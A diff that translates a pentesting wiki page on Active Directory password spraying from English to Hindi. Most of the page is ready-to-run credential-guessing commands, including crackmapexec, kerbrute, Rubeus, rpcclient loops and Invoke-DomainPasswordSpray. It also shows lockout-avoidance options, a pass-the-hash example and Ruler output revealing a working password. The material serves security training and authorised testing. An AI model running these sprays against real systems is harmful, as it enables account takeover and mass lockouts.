@@ -4,23 +4,22 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+अपने **मोबाइल सुरक्षा** में विशेषज्ञता को 8kSec अकादमी के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 ## **Password Spraying**
 
-Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
-By **default** the **minimum** **password** **length** is **7**.
+एक बार जब आप कई **मान्य उपयोगकर्ता नाम** ढूंढ लेते हैं, तो आप प्रत्येक खोजे गए उपयोगकर्ताओं के साथ सबसे **सामान्य पासवर्ड** आजमा सकते हैं (पर्यावरण की पासवर्ड नीति को ध्यान में रखें)।\
+**डिफ़ॉल्ट** रूप से **न्यूनतम** **पासवर्ड** **लंबाई** **7** है।
 
-Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+सामान्य उपयोगकर्ता नामों की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
+ध्यान दें कि यदि आप कई गलत पासवर्ड आजमाते हैं तो आप **कुछ खातों को लॉक कर सकते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।
 
-### Get password policy
+### पासवर्ड नीति प्राप्त करें
 
-If you have some user credentials or a shell as a domain user you can **get the password policy with**:
-
+यदि आपके पास कुछ उपयोगकर्ता क्रेडेंशियल्स या एक डोमेन उपयोगकर्ता के रूप में एक शेल है, तो आप **पासवर्ड नीति प्राप्त कर सकते हैं**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -37,57 +36,45 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
+### Linux से शोषण (या सभी)
 
-### Exploitation from Linux (or all)
-
-- Using **crackmapexec:**
-
+- **crackmapexec** का उपयोग करते हुए:
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-
-- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
-
+- [**kerbrute**](https://github.com/ropnop/kerbrute) (गो) का उपयोग करना
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-
-- [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
-
+- [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-
-- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
-
+- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग करना - अनुशंसित नहीं है कभी-कभी काम नहीं करता
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-
-- With the `scanner/smb/smb_login` module of **Metasploit**:
+- **Metasploit** के `scanner/smb/smb_login` मॉड्यूल के साथ:
 
 ![](<../../images/image (745).png>)
 
-- Using **rpcclient**:
-
+- **rpcclient** का उपयोग करते हुए:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
-    rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
+rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
+#### Windows से
 
-#### From Windows
-
-- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
-
+- [Rubeus](https://github.com/Zer1t0/Rubeus) के ब्रूट मॉड्यूल के साथ संस्करण:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -95,46 +82,37 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-
-- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):
-
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड नीति प्राप्त करेगा और इसके अनुसार प्रयासों को सीमित करेगा):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-
 - With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
-
 ```
 Invoke-SprayEmptyPassword
 ```
-
-## Brute Force
-
+## ब्रूट फोर्स
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+p**assword spraying outlook** के लिए कई उपकरण हैं।
 
 - With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
 - with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
+- With [Ruler](https://github.com/sensepost/ruler) (विश्वसनीय!)
 - With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
-
+इन उपकरणों में से किसी का उपयोग करने के लिए, आपको एक उपयोगकर्ता सूची और एक पासवर्ड / पासवर्ड की एक छोटी सूची की आवश्यकता है।
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
-    [x] Failed: larsson:Summer2020
-    [x] Failed: cube0x0:Summer2020
-    [x] Failed: a.admin:Summer2020
-    [x] Failed: c.cube:Summer2020
-    [+] Success: s.svensson:Summer2020
+[x] Failed: larsson:Summer2020
+[x] Failed: cube0x0:Summer2020
+[x] Failed: a.admin:Summer2020
+[x] Failed: c.cube:Summer2020
+[+] Success: s.svensson:Summer2020
 ```
-
 ## Google
 
 - [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
@@ -154,9 +132,8 @@ To use any of these tools, you need a user list and a password / a small list of
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+अपने **मोबाइल सुरक्षा** में विशेषज्ञता को गहरा करें 8kSec अकादमी के साथ। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
